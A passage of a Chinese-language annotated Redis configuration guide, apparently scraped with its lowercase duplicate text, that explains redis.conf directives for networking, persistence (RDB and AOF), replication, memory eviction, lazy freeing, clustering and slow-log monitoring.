maxmemory\n\nmaxmemory <bytes>\n\n\n1\n\n\n将内存使用限制设置为指定的字节数。当达到内存限制时，Redis 将尝试根据所选的策略来删除 key（请参见 maxmemory-policy）。\n\n如果 Redis 无法根据该策略删除 key，或者如果该策略设置为 \'noeviction\'，则 Redis 将开始对将使用更多内存的命令（例如 SET，LPUSH 等）进行错误答复，并将继续答复诸如 GET 之类的只读命令。(不支持写，只支持读)\n\n如果是主从复制，建议您为 maxmemory 设置一个下限，以便系统上有一些可用内存用于 ‘从’ 输出缓冲区（但是如果策略为 \'noeviction\'，则不需要这样做）。\n\n\n# maxmemory-policy\n\nmaxmemory-policy noeviction\n\n\n1\n\n\nmaxmemory 策略：达到 maxmemory 时，Redis 将如何选择要删除的内容。您可以从以下行为中选择一种：\n\n * volatile-lru：利用 LRU 算法移除过期 keys。\n * allkeys-lru：利用 LRU 算法移除 keys。\n * volatile-random：随机移除过期 keys。\n * allkeys-random：随机移除 keys。\n * volatile-ttl：按照最近过期时间来删除（辅以 TTL），移除即将过期的 keys。\n * noeviction：不移除任何 key，只是返回一个写错误。\n\n\n# maxmemory-samples\n\nmaxmemory-samples 5\n\n\n1\n\n\nRedis 中的 LRU 不是严格意义上的 LRU 算法实现，是一种近似的 LRU 实现，主要是为了节约内存占用以及提升性能。\n\nRedis 的 LRU 是取出 配置的数目的 key (5)，然后从中选择一个最近最不经常使用的 key 进行置换。\n\n对 LRU 来说 5 是比较合适的。10 已经很接近于真正的 LRU，但会消耗更多的 CPU。3 会更快但没有那么精确。\n\n\n# replica-ignore-maxmemory\n\nreplica-ignore-maxmemory yes\n\n\n1\n\n\n从 Redis 5 开始，默认情况下，replica 节点会忽略 maxmemory 设置（除非在发生 failover 后，此节点被提升为 master 节点）。 这意味着只有 master 才会执行过期删除策略，并且 master 在删除键之后会对 replica 发送 DEL 命令。\n\n这个行为保证了 master 和 replicas 的一致性，并且这通常也是你需要的，但是若你的 replica 节点是可写的， 或者你希望 replica 节点有不同的内存配置，并且你确保所有到 replica 写操作都幂等的，那么你可以修改这个默认的行为 （请确保你明白你在做什么）。\n\n需要注意的是默认情况下 replica 节点不会执行过期策略，它有可能使用了超过 maxmemory 设定的值的内存。 因此你需要监控 replicas 节点所在的机器并且确保在 master 节点到达配置的 maxmemory 大小时， replicas 节点不会超过物理内存的大小。\n\n\n# active-expire-effort\n\nactive-expire-effort 1\n\n\n1\n\n\n\n# lazy freeing 懒惰释放\n\nlazy free 应用于被动删除中，目前有 4 种场景，每种场景对应一个配置参数； 默认都是关闭。\n\nlazyfree-lazy-eviction no\nlazyfree-lazy-expire no\nlazyfree-lazy-server-del no\nreplica-lazy-flush no\n\n\n1\n2\n3\n4\n\n\n\n# lazyfree-lazy-eviction\n\n针对 redis 内存使用达到 maxmeory，并设置有淘汰策略时；在被动淘汰键时，是否采用 lazy free 机制；\n\n因为此场景开启 lazy free, 可能使用淘汰键的内存释放不及时，导致 redis 内存超用，超过 maxmemory 的限制。此场景使用时，请结合业务测试。\n\n\n# lazyfree-lazy-expire\n\n针对设置有 TTL 的键，达到过期后，被 redis 清理删除时是否采用 lazy free 机制；\n\n此场景建议开启，因 TTL 本身是自适应调整的速度。\n\n\n# lazyfree-lazy-server-del\n\n针对有些指令在处理已存在的键时，会带有一个隐式的 DEL 键的操作。rename 命令当目标键已存在，redis 会先删除目标键，如果这些目标键是一个 big key, 那就会引入阻塞删除的性能问题。 此参数设置就是解决这类问题，建议可开启。\n\n\n# slave-lazy-flush\n\n针对 slave 进行全量数据同步，slave 在加载 master 的 RDB 文件前，会运行 flushall 来清理自己的数据场景，参数设置决定是否采用异常 flush 机制。如果内存变动不大，建议可开启。可减少全量同步耗时，从而减少主库因输出缓冲区爆涨引起的内存使用增长。\n\n\n# lazyfree-lazy-user-del\n\n对于不容易用 UNLINK 调用替换用户代码 DEL 调用的情况，也可以使用 lazyfree-lazy-user-del yes 配置指令将 DEL 命令的默认行为修改为与 UNLINK 完全相同。\n\n\n# threaded I/O 线程\n\n默认情况下，线程是禁用的，我们建议仅在具有至少 4 个或更多内核的计算机上启用它，而至少保留一个备用内核。使用 8 个以上的线程不太可能有很大帮助。我们还建议在确实存在性能问题时再使用线程 I / O，Redis 实例会使用很大一部分 CPU 时间，否则就没有必要使用此功能。\n\nio-threads 4\n\n\n1\n\n\n因此，如果您有四个核的，请尝试使用 2 或 3 个 I / O 线程，如果您有 8 个核，请尝试使用 6 个线程。\n\n\n# io-threads-do-reads\n\nio-threads-do-reads no\n\n\n1\n\n\n通常，将 io-threads 设置为 1 只会使用主线程。启用 I / O 线程后，我们仅将线程用于写操作，即对 write 系统调用进行线程化，并将客户端缓冲区传输到套接字。但是，也可以通过 io-threads-do-reads yes 来启用读取线程和协议解析。通常，线程读取没有太大帮助。\n\n无法在运行时通过 CONFIG SET 更改此配置指令。启用 S SL 时，Aso 此功能当前不起作用。\n\n\n# kernel oom control 内核 oom 控制\n\n这个 oom-score-adj 参数是用来 Linux 内核控制调优的，在 Linux 系统中，当内存溢出时，可以提示内核 OOM killer 应该首先杀死哪些进程。\n\noom-score-adj no\n\n\n1\n\n\n启用此功能可使 Redis 根据其进程主动控制其所有进程的 oom_score_adj 值。默认分数将尝试使后台子进程在所有其他进程之前被杀死，而 replicas 在主数据库之前被杀死。\n\noom-score-adj-values 0 200 800\n\n\n1\n\n\n默认 oom-score-adj-values 不设置的情况下会优先杀死后台子进程，然后主从节点优先优先杀死从节点。\n\n所以这 3 个值分别用来设置主、从、后台子进程的分值的，分值范围从 -1000 ~ 1000，分值越高越有可能被先杀死。\n\n\n# append only mode AOF 追加模式\n\nRedis 可以实现数据的持久化存储，即将数据保存到磁盘上。\nRedis 的持久化存储提供两种方式：RDB 与 AOF。RDB 是默认配置。AOF 需要手动开启。\n现在 Redis 的配置中默认是关闭 AOF 模式的。\n\n\n# appendonly\n\nappendonly no\n\n\n1\n\n\n是否开启 AOF\n\n\n# appendfilename\n\nappendfilename "appendonly.aof"\n\n\n1\n\n\n保存数据的 AOF 文件名称\n\n\n# appendfsync\n\n# appendfsync always\nappendfsync everysec\n# appendfsync no\n\n\n1\n2\n3\n\n\nRedis 支持 3 种不同的模式：\n\n * no：不即时同步，由操作系统控制何时刷写到磁盘上，这种模式速度最快；\n * always：每次只写日志，速度较慢，但最安全；\n * everysec：每秒钟同步一次，折中的方案。\n\n\n# no-appendfsync-on-rewrite\n\nno-appendfsync-on-rewrite no\n\n\n1\n\n\n当使用 AOF 的 appendfsync 设置为 always 或 everysec 时，后台的存储进程会执行大量的磁盘 I/O 操作，在一些 Linux 架构中，Redis fsync () 调用时可能会阻塞很久。这个问题当前并没有修复，即使是在一个不同的线程执行 fsync 也会阻塞我们的同步写调用。\n\n为了缓解这个问题，可以使用以下选项，它将会在有一个 BGSAVE 或 BGREWRITEAOF 正在运行时，阻止主进程调用 fsync ()。\n\n这意味着有另一个子进程在存储时，Redis 的持久性等同于 appendfsync no。在实践中，意味着在最坏的情况下它可能丢失多达 30 秒的日志（默认的 Linux 设置）。\n\n如果你有潜在的问题需要更改它为 “yes”。否则从持久性的观点来看 “no” 是最安全的选择。\n\n\n# auto-aof-rewrite-percentage auto-aof-rewrite-min-size\n\nauto-aof-rewrite-percentage 100\n\n\n1\n\n\naof 文件增长比例，指当前 aof 文件比上次重写的增长比例大小。aof 重写即在 aof 文件在一定大小之后，重新将整个内存写到 aof 文件当中，以反映最新的状态 (相当于 bgsave)。这样就避免了，aof 文件过大而实际内存数据小的问题 (频繁修改数据问题).\n\n\n# auto-aof-rewrite-min-size\n\nauto-aof-rewrite-min-size 64mb\n\n\n1\n\n\naof 文件重写最小的文件大小，即最开始 aof 文件必须要达到这个文件时才触发，后面的每次重写就不会根据这个变量了 (根据上一次重写完成之后的大小). 此变量仅初始化启动 redis 有效。如果是 redis 恢复时，则 lastSize 等于初始 aof 文件大小。\n\n# rewrite 机制\n\n其实 Redis oaf 机制包括了两件事，rewrite 和 AOF。rewrite 类似于普通数据库管理系统日志恢复点，当 AOF 文件随着写命令的运行膨胀时，当文件大小触碰到临界时，rewrite 会被运行。\n\nrewrite 会像复制一样，fork 出一个子进程，创建一个临时文件，遍历数据库，将每个 key、value 对输出到临时文件。输出格式就是 Redis 的命令，但是为了减小文件大小，会将多个 key、value 对集合整理用一条命令表达。在 rewrite 期间的写操作会保存在内存的 rewrite buffer 中，rewrite 成功后这些操作也会复制到临时文件中，在最后临时文件会代替 AOF 文件。\n\n简单来说：aof 里存放了所有的 redis 操作指令，当 aof 文件达到一定条件或者手动 bgrewriteaof 命令都可以触发 rewrite。rewrite 之后 aof 文件会保存 keys 的最后的状态，清除掉之前冗余的，来缩小这个文件。这里所谓的缩小就是 整理指令 ，比如客户端发送过三个命令：\n\nlpush key 1 2 3\n# 移出左边第一个元素，也就是把上面的元素 1 移出\nlpop key \nlpush key 4 5 6\n\n\n1\n2\n3\n4\n\n\n整理后的指令文件是\n\nlpush key 4 5 6 2 3\n\n\n1\n\n\n\n# aof-load-truncated\n\naof-load-truncated yes\n\n\n1\n\n\n指 redis 在恢复时，会忽略最后一条可能存在问题的指令。默认值 yes。即在 aof 写入时，可能存在指令写错的问题 (突然断电，写了一半)，这种情况下，yes 会 log 并继续，而 no 会直接恢复失败.\n\n\n# aof-use-rdb-preamble\n\naof-use-rdb-preamble yes\n\n\n1\n\n\n混合持久化同样也是通过 bgrewriteaof 完成的，不同的是当开启混合持久化时，fork 出的子进程先将共享的内存副本全量的以 RDB 方式写入 aof 文件，然后在将重写缓冲区的增量命令以 AOF 方式写入到文件，写入完成后通知主进程更新统计信息，并将新的含有 RDB 格式和 AOF 格式的 AOF 文件替换旧的的 AOF 文件。简单的说：新的 AOF 文件前半段是 RDB 格式的全量数据后半段是 AOF 格式的增量数据。\n\n\n# lua scripting lua 脚本\n\nRedis 提供了 Lua 脚本功能来让用户实现自己的原子命令，但也存在着风险，编写不当的脚本可能阻塞线程导致整个 Redis 服务不可用。\n\nlua-time-limit 5000\n\n\n1\n\n\nRedis 的配置文件中提供了如下配置项来规定最大执行时长。\n\n但这里有个坑，当一个脚本达到最大执行时长的时候，Redis 并不会强制停止脚本的运行，仅仅在日志里打印个警告，告知有脚本超时。\n\n因为 Redis 必须保证脚本执行的原子性，中途停止可能导致内存的数据集上只修改了部分数据。\n\n如果时长达到 Lua-time-limit 规定的最大执行时间，Redis 只会做这几件事情：\n\n * 日志记录有脚本运行超时\n * 开始允许接受其他客户端请求，但仅限于 SCRIPT KILL 和 SHUTDOWN NOSAVE 两个命令\n * 其他请求仍返回 busy 错误\n\n\n# - cluster 集群\n\ncluster-enabled yes\n\n\n1\n\n\n开启集群模式\n\ncluster-config-file nodes-6379.conf\n\n\n1\n\n\n1、这个配置文件不是要我们去配的，而是 Redis 运行时保存配置的文件，所以我们也不可以修改这个文件。\n\n2、Redis 集群节点每次发生更改时自动保留集群配置（基本上为状态）的文件，以便能够 在启动时重新读取它。\n\n3、该文件列出了集群中其他节点，它们的状态，持久变量等等信息。 由于某些消息的接收，通常会将此文件重写并刷新到磁盘上。\n\n4、生成的文件在 dir 指定路径下\n\ncluster-node-timeout 15000\n\n\n1\n\n\n超时时间是集群中各节点相互通讯时，允许 "失联" 的最大毫秒数，上面的配置为 15 秒，如果超过 15 秒某个节点没向其它节点汇报成功，认为该节点挂了。\n\ncluster-replica-validity-factor 10\n\n\n1\n\n\n1、如果设置为 0，无论主节点和从节点之间的链路断开连接的时间长短，从节点都将尝试故障切换为主节点。\n\n2、 如果该值为正值，则计算最大断开时间作为节点超时值乘以此选项提供的系数，如果该节点是从节点，则在主链路断开连接的时间超过指定的超时值时，它不会尝试启动故障切换。 例如，如果节点超时设置为 5 秒，并且有效因子设置为 10，则与主节点断开连接超过 50 秒的从节点将不会尝试对其主节点进行故障切换。\n\n3、请注意，如果没有从服务器节点能够对其进行故障转移，则任何非零值都可能导致 Redis 集群在主服务器出现故障后不可用。 在这种情况下，只有原始主节点重新加入集群时，集群才会返回可用。\n\ncluster-migration-barrier 1\n\n\n1\n\n\n主节点将保持连接的最小从节点数量，以便另一个从节点迁移到不受任何从节点覆盖的主节点。\n\ncluster-require-full-coverage yes\n\n\n1\n\n\n当 cluster-require-full-coverage 为 no 时，表示当负责一个插槽的主库下线且没有相应的从库进行故障恢复时，集群仍然可用。\n\n当 cluster-require-full-coverage 为 yes 时，表示当负责一个插槽的主库下线且没有相应的从库进行故障恢复时，集群不可用。\n\ncluster-replica-no-failover no\n\n\n1\n\n\n设置为 yes 时，此选项可防止从服务器在主服务器故障期间尝试对主服务器进行故障转移。但是，主服务器仍然可以执行手动故障转移（如果被迫执行）。\n\ncluster-allow-reads-when-down no\n\n\n1\n\n\n默认为 no, 表示当集群因主节点数量达不到最小值或有散列槽没有分配而被标记为失效时，节点将停止所有的客户端通讯。 这样可以避免从一个不知道集群状态变化的节点读到不一致数据的危险。 设为 yes 则允许集群失效时仍可以由节点中读取数据。 这样既保证读操作的高可用性， 也避免不一致写操作，同时当 Redis Cluster 仅包含 1 至 2 个节点，而某个节点失效后无可用从节点替代，且因节点数量不足，无法自动重新分配散列槽，则该参数设为 yes 可保证节点仍然可执行读操作。\n\n\n# slow log 慢日志\n\nslowlog-log-slower-than 1000\n\n\n1\n\n\n其中 slowlog-log-slower-than 表示 slowlog 的划定界限，只有 query 执行时间大于 slowlog-log-slower-than 的才会定义成慢查询，才会被 slowlog 进行记录。slowlog-log-slower-than 设置的单位是微妙，默认是 10000 微妙，也就是 10ms\n\nslowlog-max-len 128\n\n\n1\n\n\nslowlog-max-len 表示慢查询最大的条数，当 slowlog 超过设定的最大值后，会将最早的 slowlog 删除，是个 FIFO 队列\n\n\n# latency monitor 延迟监视器\n\nlatency-monitor-threshold 0\n\n\n1\n\n\nredis 延时监控系统在运行时会采样一些操作，以便收集可能导致延时的数据根源。\n通过 LATENCY 命令 可以打印一些图样和获取一些报告，方便监控\n这个系统仅仅记录那个执行时间大于或等于预定时间（毫秒）的操作，\n这个预定时间是通过 latency-monitor-threshold 配置来指定的，\n当设置为 0 时，这个监控系统处于停止状态\n\n\n# event notification 事件通知\n\nnotify-keyspace-events ""\n\n\n1\n\n\n\n# advanced config 高级配置\n\n当哈希条目只有少量条目且最大条目未超过给定阈值时，将使用内存高效的数据结构对其进行编码\n\nhash-max-ziplist-entries 512\n\n\n1\n\n\n数据量小于等于 hash-max-ziplist-entries 的用 ziplist，大于 hash-max-ziplist-entries 用 hash\n\nhash-max-ziplist-value 64\n\n\n1\n\n\nvalue 大小小于等于 hash-max-ziplist-value 的用 ziplist，大于 hash-max-ziplist-value 用 hash。',normalizedContent:'> + 默认配置打开，- 默认配置关闭\n\n\n# network 网络\n\n\n# + bind\n\n# 绑定ip\nbind 127.0.0.1\n\n\n1\n2\n\n\n默认是 127.0.0.1，修改的 ip 如果不为本机 ip 是无法启动的。可以直接注释 bind，这样所有机器可连，但会受 protected-mode 参数影响。\n\n\n# + protected-mode\n\n# 受保护的 默认开启\nprotected-mode yes\n\n\n1\n2\n\n\n保护模式下，无论 bind 是否被注释都无法远程访问。想允许外网或局域网访问需要关闭保护模式，且注释 bind。\n\n\n# + port\n\n### 端口默认\nport 6379\n\n\n1\n2\n\n\n\n# + tcp-backlog\n\ntcp-backlog 511\n\n\n1\n\n\nlinux 内核为每个 tcp 服务器程序维护两条 backlog 队列，一条是 tcp 层的未连接队列，一条是应用层的已连接队列，分别对应 net.ipv4.tcp_max_syn_backlog 和 net.core.somaxconn 两个内核参数。\n\n一个客户端连接在完成 tcp 3 次握手之前首先进入到未连接队列，完成握手之后正式建立连接，进入已连接队列，交付给应用程序处理。应用程序调用 accept () 函数从已连接队列取出连接进行处理。应用层在调用 listen () 函数时指定的 backlog 是已连接队列大小，如果大于 somaxconn 将被设为 somaxconn。\n\n如果应用层不调用 accept () 函数处理一个连接，或者处理不及时的话，将会导致已连接队列堆满。已连接队列已满的话会导致未连接队列在处理完 3 次握手之后无法进入已连接队列，最终也导致未连接队列堆满，在服务器看到处于未连接队列中的连接状态为 syn_recv。 新进来的客户端连接将会一直处于 syn_sent 状态等待服务器的 ack 应答，最终导致连接超时。\n\n# 查看队列大小\n\n查看未连接队列默认值：\n\ncat /proc/sys/net/ipv4/tcp_max_syn_backlog\n\n\n1\n\n\n查看已连接队列默认值：\n\ncat /proc/sys/net/core/somaxconn\n\n\n1\n\n\n# 修改队列大小\n\n可以直接改写这两个文件的值。要永久修改这两个内核参数的话可以写到 /etc/sysctl.conf\n\nnet.ipv4.tcp_max_syn_backlog = 1024\nnet.core.somaxconn = 1024\n\n\n1\n2\n\n\n改完后执行 sysctl -p 让修改立即生效。\n\n\n# timeout\n\ntimeout 0\n\n\n1\n\n\n客户端闲置 n 秒后关闭连接（0 禁用）\n\n\n# tcp-keepalive\n\ntcp-keepalive 300\n\n\n1\n\n\n向客户端发送 tcp ack 检测连接是否断开，保证连接活跃。单位秒，默认 300 秒发送一次，如果等于 0 就是禁用。\n\n\n# general 一般\n\n\n# daemonize\n\ndaemonize no\n\n\n1\n\n\n默认情况下，redis 不会作为守护程序运行。如果需要，请设置为 yes。请注意，redis 守护进程将在 /var/run/redis.pid 中写入一个 pid 文件。\n\n\n# supervised\n\nsupervised no\n\n\n1\n\n\n如果需要在机器启动（upstart 模式 或 systemd 模式）时就启动 redis 服务器，可以通过该选项来配置 redis。\n\n * supervised no - 不会与 supervised tree 进行交互\n * supervised upstart - 将 redis 服务器添加到 sigstop 模式中\n * supervised systemd - 将 ready=1 写入 $notify_socket\n * supervised auto - 根据环境变量 upstart_job 或 notify_socket 检测 upstart 还是 systemd\n\n上述 supervision 方法（upstart 或 systemd）仅发出 “程序已就绪” 信号，不会继续给 supervisor 返回 ping 回复。\n\n\n# pidfile\n\npidfile /var/run/redis_6379.pid\n\n\n1\n\n\n当 redis 服务器已守护进程启动时，如果指定了配置文件，则直接使用，如果没有指定，则创建 /var/run/redis.pid 作为配置文件。\n\n\n# loglevel\n\nloglevel notice\n\n\n1\n\n\n指定服务器的 verbosity 级别。redis 提供四种级别：\n\n * debug 包含大量信息，用于开发和测试\n * verbose 包含一些稀有的有用信息，但没有 debug 级别混乱\n * notice 适量提示信息，用于生产环境\n * warning 只包含非常重要和关键的信息\n\n\n# logfile\n\nlogfile ""\n\n\n1\n\n\n指定日志文件名称。指定为空时将输出到标准输出设备中。如果 redis 以守护进程启动，当日志文件名称为空时，日志将会输出到 /dev/null。\n\n\n# databases\n\ndatabases 16\n\n\n1\n\n\n设置数据库的数量。默认使用 0 号数据库。可以在每一个连接上使用 select <dbid> 来指定另外的数据库，但是这个值必须在 0 到 database -1 之间。\n\n\n# always-show-logo\n\nalways-show-logo yes\n\n\n1\n\n\nredis 启动的时候显示 日志。\n\n\n# snapshotting 快照\n\n\n# save\n\nsave 900 1\nsave 300 10\nsave 60 10000\n\n\n1\n2\n3\n\n\n过了 900 秒并且有 1 个 key 发生了改变，触发 save 动作\n过了 300 秒并且有 10 个 key 发生了改变，触发 save 动作\n过了 60 秒并且至少有 10000 个 key 发生了改变，触发 save 动作\n\n\n# stop-writes-on-bgsave-error\n\nstop-writes-on-bgsave-error yes\n\n\n1\n\n\n默认值为 yes。当启用了 rdb 且最后一次后台保存数据失败，redis 是否停止接收数据。这会让用户意识到数据没有正确持久化到磁盘上，否则没有人会注意到灾难（disaster）发生了。如果 redis 重启了，那么又可以重新开始接收数据了\n\n\n# rdbcompression\n\nrdbcompression yes\n\n\n1\n\n\n默认值是 yes。对于存储到磁盘中的快照，可以设置是否进行压缩存储。如果是的话，redis 会采用 lzf 算法进行压缩。如果你不想消耗 cpu 来进行压缩的话，可以设置为关闭此功能，但是存储在磁盘上的快照会比较大。\n\n\n# rdbchecksum\n\nrdbchecksum yes\n\n\n1\n\n\n在存储快照后，我们还可以让 redis 使用 crc64 算法来进行数据校验，但是这样做会增加大约 10% 的性能消耗，如果希望获取到最大的性能提升，可以关闭此功能。\n\n\n# dbfilename\n\ndbfilename dump.rdb\n\n\n1\n\n\nrdb 文件得文件名称\n\n\n# rdb-del-sync-files\n\nrdb-del-sync-files no\n\n\n1\n\n\nrdb 文件是否删除同步锁\n\ndir ./\n\n\n1\n\n\n设置 rdb 文件存放得路径\n\n\n# 创建 rdb 文件机制\n\nfork 出一个子进程来处理，它和父进程共享内存里面的代码段和数据段。这时你可以把父子进程想象成一个连体婴儿，他们在共享身体。这就是 linux 操作系统的机制，为了节约内存资源，所以尽可能让他们共享起来。在进程分离的一瞬间，内存的增长几乎没有明显变化。\n\n子进程做数据持久化，不会修改现有的内存数据结构，它只是对数据结构进行遍历读取，然后序列化到磁盘中。但是父进程不一样，它必须持续服务客户请求，然后堆内存数据结构进行不间断的修改。\n\n这个时候就会使用操作系统的 cow (copy on write) 机制来进行数据段页面的分离。数据段是由很多操作系统的页面组合而成，当父进程对其中一个页面的数据进行修改时，会将被共享的页面复制一份分离出来，然后对这个复制的页面进行修改。这时子进程相应的页面是没有变化的，还是进程产生那一瞬间的数据。\n\n随着父进程修改操作的持续进行，越来越多的共享页面被分离出来，内存就会持续增长，但是也不会超过原有数据内存的 2 倍大小。另外，redis 实例里冷数据占的比例往往是比较高的，所以很少会出现所有的页面都被分离的情况，被分离的往往只有其中一部分页面。每个页面的大小只有 4kb，一个 redis 实例里面一般都会有成千上万个页面。\n\n子进程因为数据没有变化，它能看到内存里的数据在进程产生的一瞬间就凝固了，再也不会改变，这也时为什么 redis 的持久化叫 快照 的原因。接下来子进程就可以非常安心地便利数据，进行序列化磁盘了。\n\n\n# replication 主从复制\n\n\n# replica-serve-stale-data\n\nreplica-serve-stale-data yes\n\n\n1\n\n\n当一个 slave 与 master 失去联系时，或者复制正在进行的时候，slave 应对请求的行为:\n\n * 如果为 yes（默认值），slave 仍然会应答客户端请求，但返回的数据可能是过时，或者数据可能是空的在第一次同步的时候\n * 如果为 no ，在你执行除了 info 和 salveof 之外的其他命令时，slave 都将返回一个 "sync with master in progress" 的错误。\n\n\n# replica-read-only\n\nreplica-read-only yes\n\n\n1\n\n\n设置 slave 是否是只读的。从 2.6 版起，slave 默认是只读的\n\n\n# repl-diskless-sync\n\nrepl-diskless-sync no\n\n\n1\n\n\n主从数据复制是否使用无硬盘复制功能。\n\n\n# repl-diskless-sync-delay\n\nrepl-diskless-sync-delay 5\n\n\n1\n\n\n无磁盘 (diskless) 方式在进行数据传递之前会有一个时间的延迟，以便 slave 端能够进行到待传送的目标队列中，这个时间默认是 5 秒\n\n\n# repl-diskless-load\n\nrepl-diskless-load disabled\n\n\n1\n\n\n\n# repl-disable-tcp-nodelay\n\nrepl-disable-tcp-nodelay no\n\n\n1\n\n\n是否启用 tcp_nodelay，如果启用则会使用少量的 tcp 包和带宽去进行数据传输到 slave 端，当然速度会比较慢；如果不启用则传输速度比较快，但是会占用比较多的带宽。\n\n\n# replica-priority\n\nreplica-priority 100\n\n\n1\n\n\n当 master 不能正常工作的时候，redis sentinel 会从 slaves 中选出一个新的 master，这个值越小，就越会被优先选中，但是如果是 0 ， 那是意味着这个 slave 不可能被选中。 默认优先级为 100。\n\n\n# - keys tracking 键追踪\n\ntracking-table-max-keys 1000000\n\n\n1\n\n\n\n# security 安全\n\n\n# + acllog-max-len\n\nacllog-max-len 128\n\n\n1\n\n\n\n# - aclfile\n\naclfile /etc/redis/users.acl\n\n\n1\n\n\n\n# - requirepass\n\nrequirepass foobared\n\n\n1\n\n\n\n# - rename-command\n\nrename-command config ""\n\n\n1\n\n\n\n# clients 客户\n\n\n# maxclients\n\nmaxclients 10000\n\n\n1\n\n\n设置最大连接客户端数。默认情况下，此限制设置为 10000 个客户端，但是，如果 redis 服务器无法将进程文件限制配置为允许指定的限制，则允许的最大客户端数将设置为当前文件限制减去 32（因为 redis 保留了内部使用的文件描述符很少）\n\n达到限制后，redis 将关闭所有新连接，并发送错误消息 “已达到最大客户端数。\n\n当使用 redis cluster 时，最大连接数也会与集群总线共享：集群中的每个节点将使用两个连接，一个进入，另一个向外。对于非常大的集群，重要的是相应地调整限制大小。\n\n\n# memory management 内存管理\n\n\n# maxmemory\n\nmaxmemory <bytes>\n\n\n1\n\n\n将内存使用限制设置为指定的字节数。当达到内存限制时，redis 将尝试根据所选的策略来删除 key（请参见 maxmemory-policy）。\n\n如果 redis 无法根据该策略删除 key，或者如果该策略设置为 \'noeviction\'，则 redis 将开始对将使用更多内存的命令（例如 set，lpush 等）进行错误答复，并将继续答复诸如 get 之类的只读命令。(不支持写，只支持读)\n\n如果是主从复制，建议您为 maxmemory 设置一个下限，以便系统上有一些可用内存用于 ‘从’ 输出缓冲区（但是如果策略为 \'noeviction\'，则不需要这样做）。\n\n\n# maxmemory-policy\n\nmaxmemory-policy noeviction\n\n\n1\n\n\nmaxmemory 策略：达到 maxmemory 时，redis 将如何选择要删除的内容。您可以从以下行为中选择一种：\n\n * volatile-lru：利用 lru 算法移除过期 keys。\n * allkeys-lru：利用 lru 算法移除 keys。\n * volatile-random：随机移除过期 keys。\n * allkeys-random：随机移除 keys。\n * volatile-ttl：按照最近过期时间来删除（辅以 ttl），移除即将过期的 keys。\n * noeviction：不移除任何 key，只是返回一个写错误。\n\n\n# maxmemory-samples\n\nmaxmemory-samples 5\n\n\n1\n\n\nredis 中的 lru 不是严格意义上的 lru 算法实现，是一种近似的 lru 实现，主要是为了节约内存占用以及提升性能。\n\nredis 的 lru 是取出 配置的数目的 key (5)，然后从中选择一个最近最不经常使用的 key 进行置换。\n\n对 lru 来说 5 是比较合适的。10 已经很接近于真正的 lru，但会消耗更多的 cpu。3 会更快但没有那么精确。\n\n\n# replica-ignore-maxmemory\n\nreplica-ignore-maxmemory yes\n\n\n1\n\n\n从 redis 5 开始，默认情况下，replica 节点会忽略 maxmemory 设置（除非在发生 failover 后，此节点被提升为 master 节点）。 这意味着只有 master 才会执行过期删除策略，并且 master 在删除键之后会对 replica 发送 del 命令。\n\n这个行为保证了 master 和 replicas 的一致性，并且这通常也是你需要的，但是若你的 replica 节点是可写的， 或者你希望 replica 节点有不同的内存配置，并且你确保所有到 replica 写操作都幂等的，那么你可以修改这个默认的行为 （请确保你明白你在做什么）。\n\n需要注意的是默认情况下 replica 节点不会执行过期策略，它有可能使用了超过 maxmemory 设定的值的内存。 因此你需要监控 replicas 节点所在的机器并且确保在 master 节点到达配置的 maxmemory 大小时， replicas 节点不会超过物理内存的大小。\n\n\n# active-expire-effort\n\nactive-expire-effort 1\n\n\n1\n\n\n\n# lazy freeing 懒惰释放\n\nlazy free 应用于被动删除中，目前有 4 种场景，每种场景对应一个配置参数； 默认都是关闭。\n\nlazyfree-lazy-eviction no\nlazyfree-lazy-expire no\nlazyfree-lazy-server-del no\nreplica-lazy-flush no\n\n\n1\n2\n3\n4\n\n\n\n# lazyfree-lazy-eviction\n\n针对 redis 内存使用达到 maxmeory，并设置有淘汰策略时；在被动淘汰键时，是否采用 lazy free 机制；\n\n因为此场景开启 lazy free, 可能使用淘汰键的内存释放不及时，导致 redis 内存超用，超过 maxmemory 的限制。此场景使用时，请结合业务测试。\n\n\n# lazyfree-lazy-expire\n\n针对设置有 ttl 的键，达到过期后，被 redis 清理删除时是否采用 lazy free 机制；\n\n此场景建议开启，因 ttl 本身是自适应调整的速度。\n\n\n# lazyfree-lazy-server-del\n\n针对有些指令在处理已存在的键时，会带有一个隐式的 del 键的操作。rename 命令当目标键已存在，redis 会先删除目标键，如果这些目标键是一个 big key, 那就会引入阻塞删除的性能问题。 此参数设置就是解决这类问题，建议可开启。\n\n\n# slave-lazy-flush\n\n针对 slave 进行全量数据同步，slave 在加载 master 的 rdb 文件前，会运行 flushall 来清理自己的数据场景，参数设置决定是否采用异常 flush 机制。如果内存变动不大，建议可开启。可减少全量同步耗时，从而减少主库因输出缓冲区爆涨引起的内存使用增长。\n\n\n# lazyfree-lazy-user-del\n\n对于不容易用 unlink 调用替换用户代码 del 调用的情况，也可以使用 lazyfree-lazy-user-del yes 配置指令将 del 命令的默认行为修改为与 unlink 完全相同。\n\n\n# threaded i/o 线程\n\n默认情况下，线程是禁用的，我们建议仅在具有至少 4 个或更多内核的计算机上启用它，而至少保留一个备用内核。使用 8 个以上的线程不太可能有很大帮助。我们还建议在确实存在性能问题时再使用线程 i / o，redis 实例会使用很大一部分 cpu 时间，否则就没有必要使用此功能。\n\nio-threads 4\n\n\n1\n\n\n因此，如果您有四个核的，请尝试使用 2 或 3 个 i / o 线程，如果您有 8 个核，请尝试使用 6 个线程。\n\n\n# io-threads-do-reads\n\nio-threads-do-reads no\n\n\n1\n\n\n通常，将 io-threads 设置为 1 只会使用主线程。启用 i / o 线程后，我们仅将线程用于写操作，即对 write 系统调用进行线程化，并将客户端缓冲区传输到套接字。但是，也可以通过 io-threads-do-reads yes 来启用读取线程和协议解析。通常，线程读取没有太大帮助。\n\n无法在运行时通过 config set 更改此配置指令。启用 s sl 时，aso 此功能当前不起作用。\n\n\n# kernel oom control 内核 oom 控制\n\n这个 oom-score-adj 参数是用来 linux 内核控制调优的，在 linux 系统中，当内存溢出时，可以提示内核 oom killer 应该首先杀死哪些进程。\n\noom-score-adj no\n\n\n1\n\n\n启用此功能可使 redis 根据其进程主动控制其所有进程的 oom_score_adj 值。默认分数将尝试使后台子进程在所有其他进程之前被杀死，而 replicas 在主数据库之前被杀死。\n\noom-score-adj-values 0 200 800\n\n\n1\n\n\n默认 oom-score-adj-values 不设置的情况下会优先杀死后台子进程，然后主从节点优先优先杀死从节点。\n\n所以这 3 个值分别用来设置主、从、后台子进程的分值的，分值范围从 -1000 ~ 1000，分值越高越有可能被先杀死。\n\n\n# append only mode aof 追加模式\n\nredis 可以实现数据的持久化存储，即将数据保存到磁盘上。\nredis 